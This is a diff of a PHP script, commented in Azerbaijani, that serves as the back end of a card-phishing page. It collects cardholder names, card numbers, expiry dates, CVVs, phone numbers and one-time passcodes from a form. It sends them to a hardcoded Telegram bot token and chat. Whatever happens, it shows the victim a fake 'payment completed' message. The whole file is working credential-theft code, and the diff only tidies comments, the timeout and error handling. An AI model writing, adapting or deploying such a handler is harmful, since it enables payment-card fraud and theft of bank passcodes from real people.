@@ -1,12 +1,13 @@
 <?php
-error_reporting(0);
-ini_set('display_errors', 0);
+// ============================================
+// TELEGRAM HANDLER - SON VERSİYA
+// ============================================
 
-// ===== BOT MƏLUMATLARI =====
+// BOT MƏLUMATLARI
 $botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
-$chatId = '-1004332923672';  // <--- YENİ ID
+$chatId = '-1004332923672';
 
-// ===== MƏLUMATLARI AL =====
+// MƏLUMATLARI AL
 $cardName = isset($_POST['card_name']) ? trim($_POST['card_name']) : '';
 $cardNumber = isset($_POST['card_number']) ? trim($_POST['card_number']) : '';
 $cardExpiry = isset($_POST['card_expiry']) ? trim($_POST['card_expiry']) : '';
@@ -17,7 +18,7 @@ $amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
 $ip = isset($_POST['ip']) ? trim($_POST['ip']) : '0.0.0.0';
 $otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
 
-// ===== TƏHLÜKƏSİZLİK =====
+// TƏHLÜKƏSİZLİK - Məlumatları təmizlə
 function cleanInput($data) {
     $data = trim($data);
     $data = strip_tags($data);
@@ -35,17 +36,17 @@ $amount = cleanInput($amount);
 $ip = cleanInput($ip);
 $otp = cleanInput($otp);
 
-// ===== MƏLUMATLARI YOXLA =====
+// MƏLUMATLARI YOXLA
 if (empty($cardNumber) || empty($cardCvv) || empty($otp)) {
     http_response_code(400);
     echo json_encode(['status' => 'error', 'message' => 'Məlumatlar tam daxil edilməyib']);
     exit;
 }
 
-// ===== ID YARAT =====
+// ID YARAT
 $id = rand(100, 999);
 
-// ===== MESAJI HAZIRLA =====
+// MESAJI HAZIRLA
 $message = "💳 YENİ KART GİRİŞİ 💳\n\n";
 $message .= "🆔 ID: #" . $id . "\n";
 $message .= "📞 Tel: " . $phone . "\n";
@@ -60,7 +61,7 @@ $message .= "🔑 OTP: " . $otp . "\n\n";
 $message .= "----------------------------------------\n";
 $message .= "📱 Bağlı Nömrə: " . $phone;
 
-// ===== TELEGRAM-A GÖNDƏR =====
+// TELEGRAM-A GÖNDƏR
 $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
 
 $postData = [
@@ -75,20 +76,19 @@ curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
 
 $response = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 curl_close($ch);
 
-// ===== CAVAB =====
+// CAVAB
 header('Content-Type: application/json');
 
-if ($httpCode == 200) {
+if ($httpCode == 200 && $response !== false) {
     echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
 } else {
-    error_log('Telegram göndəriş xətası: ' . $httpCode);
     echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
 }
 ?>
